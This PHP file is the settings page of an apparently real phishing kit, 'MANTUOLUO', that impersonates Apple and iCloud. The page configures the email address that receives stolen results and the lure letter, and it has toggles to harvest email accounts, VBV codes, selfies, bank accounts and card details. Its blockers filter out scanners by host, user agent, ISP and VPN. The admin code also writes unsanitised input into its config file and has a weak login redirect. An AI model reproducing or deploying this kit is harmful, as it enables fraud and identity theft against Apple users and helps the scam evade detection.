<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
function update_ini_file($data, $filepath) {
  $content = "";
  //parse the ini file to get the sections
  //parse the ini file using default parse_ini_file() PHP function
  $parsed_ini = parse_ini_file($filepath, true);
  foreach($data as $section => $values){
    if($section === "submit"){
      continue;
    }
    $content .= $section .' = "'. $values .'"'."\n";
  }
  //write it into file
  if (!$handle = fopen($filepath, 'w')) {
    return false;
  }
  $success = fwrite($handle, $content);
  fclose($handle);
}
$ini_path = '../setting.ini';

if($_SERVER['REQUEST_METHOD'] === 'POST'){
    $data = @parse_ini_file($ini_path);
    foreach($data as $datakey => $dataval){
        if(!isset($_POST[$datakey])){
            $data[$datakey] = "";
        }
    }
    foreach($_POST as $key => $post){
        $data[$key] = $post;
    }
    update_ini_file($data, $ini_path);
}
$setting = parse_ini_file($ini_path);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <title>MANTUOLUO - Admin Panel</title>
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <h3>MANTUOLUO</h3>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="active has-sub">
                            <a href="index.php">
                            <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <li>
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li>
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Bot Detected</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <h3>MANTUOLUO</h3>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li>
                            <a href="index.php">
                                <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <li class="active has-sub">
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li>
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Bot Detected</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                       
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            
                            <div class="header-button">
                                <div class="noti-wrap">
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        
                        
                        <div class="row">
                       <div class="col-lg-12">
                                
                                    <div class="col-12">
                <form action="" method="post" class="card">
                 <div class="card-header">
                                        <Strong>Manage Result Apple</Strong>
                                    </div>
                  <div class="card-body">
                    <div class="row">
                      <div class="form-group col-lg-6">
                  <label for="name">Email Result</label>
                  <input name="email_result" type="email" value="<?php echo $setting['email_result'];?>" class="form-control validate"><br>
                  <label for="name">Site Parameter</label>
                  <input name="site_parameter" type="text" value="<?php echo $setting['site_parameter'];?>" class="form-control validate"><br>
                  <label for="name">Site Password</label>
                  <input name="site_password" type="text" value="<?php echo $setting['site_password'];?>" class="form-control validate"><br>
                  <label for="name">Sender Mail / From Email</label>
                  <input name="sender_mail" type="text" value="<?php echo $setting['sender_mail'];?>" class="form-control validate"><br>
                  <label for="name">Theme</label>
                  <select name="theme" class="form-control custom-select">
                              <?php
                                if($setting['theme'] == 'apple'){
                                    echo '<option value="apple" selected="selected">Apple</option>
                                    <option value="icloud" >iCloud</option>';
                                }
                                if($setting['theme'] == 'icloud'){
                                    echo '<option value="icloud" selected="selected">iCloud</option>
                                    <option value="apple" >Apple</option>';
                                }
                              ?>
                              
                            </select><br><br>
                  <label for="name">Notice / Letter</label>
                  <select name="letter" class="form-control custom-select">
                              <?php
                                if($setting['letter'] == 'locked'){
                                    echo '<option value="locked" selected="selected">Locked</option>
                              <option value="verify" >Verify</option>
                              <option value="invoice">Invoice</option>';
                                }
                                if($setting['letter'] == 'verify'){
                                    echo '<option value="locked" >Locked</option>
                              <option value="verify" selected="selected">Verify</option>
                              <option value="invoice" >Invoice</option>';
                                }
                                if($setting['letter'] == 'invoice'){
                                    echo '<option value="locked" >Locked</option>
                              <option value="verify" >Verify</option>
                              <option value="invoice" selected="selected">Invoice</option>';
                                }
                              ?>
                              
                            </select>
                  <br><br>
                  <label for="name">Lock Country</label>
                  <select name="lock_country" class="form-control custom-select">
                    <?php
                    $list_country = array("Afghanistan","Albania","Algeria","American Samoa","Andorra","Angola","Anguilla","Antarctica","Antigua and Barbuda","Argentina","Armenia","Aruba","Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bermuda","Bhutan","Bolivia","Bosnia and Herzegovina","Botswana","Bouvet Island","Brazil","British Indian Ocean Territory","Brunei Darussalam","Bulgaria","Burkina Faso","Burundi","Cambodia","Cameroon","Canada","Cape Verde","Cayman Islands","Central African Republic","Chad","Chile","China","Christmas Island","Cocos (Keeling) Islands","Colombia","Comoros","Congo","Congo"," The Democratic Republic of The","Cook Islands","Costa Rica","Cote D'ivoire","Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Ethiopia","Falkland Islands (Malvinas)","Faroe Islands","Fiji","Finland","France","French Guiana","French Polynesia","French Southern Territories","Gabon","Gambia","Georgia","Germany","Ghana","Gibraltar","Greece","Greenland","Grenada","Guadeloupe","Guam","Guatemala","Guinea","Guinea-bissau","Guyana","Haiti","Heard Island and Mcdonald Islands","Holy See (Vatican City State)","Honduras","Hong Kong","Hungary","Iceland","India","Indonesia","Iran"," Islamic Republic of","Iraq","Ireland","Israel","Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Korea"," Democratic People's Republic of","Korea"," Republic of","Kuwait","Kyrgyzstan","Lao People's Democratic Republic","Latvia","Lebanon","Lesotho","Liberia","Libyan Arab Jamahiriya","Liechtenstein","Lithuania","Luxembourg","Macao","Macedonia"," The Former Yugoslav Republic of","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Martinique","Mauritania","Mauritius","Mayotte","Mexico","Micronesia"," Federated States of","Moldova"," Republic of","Monaco","Mongolia","Montserrat","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal","Netherlands","Netherlands Antilles","New Caledonia","New Zealand","Nicaragua","Niger","Nigeria","Niue","Norfolk Island","Northern Mariana Islands","Norway","Oman","Pakistan","Palau","Palestinian Territory"," Occupied","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Pitcairn","Poland","Portugal","Puerto Rico","Qatar","Reunion","Romania","Russian Federation","Rwanda","Saint Helena","Saint Kitts and Nevis","Saint Lucia","Saint Pierre and Miquelon","Saint Vincent and The Grenadines","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia","Senegal","Serbia and Montenegro","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","South Georgia and The South Sandwich Islands","Spain","Sri Lanka","Sudan","Suriname","Svalbard and Jan Mayen","Swaziland","Sweden","Switzerland","Syrian Arab Republic","Taiwan"," Province of China","Tajikistan","Tanzania"," United Republic of","Thailand","Timor-leste","Togo","Tokelau","Tonga","Trinidad and Tobago","Tunisia","Turkey","Turkmenistan","Turks and Caicos Islands","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States","United States Minor Outlying Islands","Uruguay","Uzbekistan","Vanuatu","Venezuela","Viet Nam","Virgin Islands"," British","Virgin Islands"," U.S.","Wallis and Futuna","Western Sahara","Yemen","Zambia","Zimbabwe");
                    if(!in_array($setting['lock_country'],$list_country)){
                        echo '<option value="" selected="selected">All Country</option>';
                    }else{
                        echo '<option value="">All Country</option>';
                    }
                    foreach($list_country as $country){
                        if($setting['lock_country'] == $country){
                            echo '<option value="'.$country.'" selected="selected">'.$country.'</option>';
                        }else{
                            echo '<option value="'.$country.'">'.$country.'</option>';
                        }
                    }
                    
                    ?>
                  </select><br><br>
                </div>
                <div class="form-group col-lg-6">
                  <label for="name">Main Setting</label><br>
                        <label class="custom-switch">
                            <input type="checkbox" name="site_param_on" class="custom-switch-input" <?php if($setting['site_param_on'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Site Parameter</span>
                          <br>
                       
                          <label class="custom-switch">
                          <input type="checkbox" name="site_pass_on" class="custom-switch-input" <?php if($setting['site_pass_on'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Site Password</span>
                          <br>

                          <label class="custom-switch">
                          <input type="checkbox" name="send_login" class="custom-switch-input" <?php if($setting['send_login'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Send Login</span>
                          <br>
                          <br>
                           <label for="name">Feature</label><br>
                           <label class="custom-switch">
                          <input type="checkbox" name="get_email" class="custom-switch-input" <?php if($setting['get_email'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Get Email Account</span>
                          <br>
                <label class="custom-switch">
                          <input type="checkbox" name="get_vbv" class="custom-switch-input" <?php if($setting['get_vbv'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Get VBV</span><br>
<label class="custom-switch">
                          <input type="checkbox" name="mix_result" class="custom-switch-input" <?php if($setting['mix_result'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Mix Result</span>                          
<br><label class="custom-switch">
                          <input type="checkbox" name="get_photo" class="custom-switch-input" <?php if($setting['get_photo'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Get Photo/Selfie</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="get_bank" class="custom-switch-input" <?php if($setting['get_bank'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Get Bank Account</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="double_cc" class="custom-switch-input" <?php if($setting['double_cc'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Double Credit Card</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="onetime" class="custom-switch-input" <?php if($setting['onetime'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Onetime Access</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="lock_platform" class="custom-switch-input" <?php if($setting['lock_platform'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Lock Platform</span>
                          <br>
                          <br>
                           <label for="name">Blocker</label><br>
                           <label class="custom-switch">
                          <input type="checkbox" name="block_host" class="custom-switch-input" <?php if($setting['block_host'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block Hostname</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="block_ua" class="custom-switch-input" <?php if($setting['block_ua'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block User Agent</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="block_iprange" class="custom-switch-input" <?php if($setting['block_iprange'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block IP Range</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="block_isp" class="custom-switch-input" <?php if($setting['block_isp'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block ISP</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="block_vpn" class="custom-switch-input" <?php if($setting['block_vpn'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block VPN/Proxy</span>
                          <br>
                          <label class="custom-switch">
                          <input type="checkbox" name="block_referrer" class="custom-switch-input" <?php if($setting['block_referrer'] == 'on'){ echo 'checked';}?>>                          <span class="custom-switch-indicator"></span>
                          <span class="custom-switch-description" style="position: absolute;">&nbsp;&nbsp; Block Referrer</span>
                          <br>

                     
                  </div>
                </div>
                
                   
                    <button type="submit" class="btn btn-primary ml-auto">Update</button>
                 
              </form>
              
            </div>
           
  
              </div>
            </div>
          </div>
                                </div>
                        <div class="row">
                            <div class="col-md-12">
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->
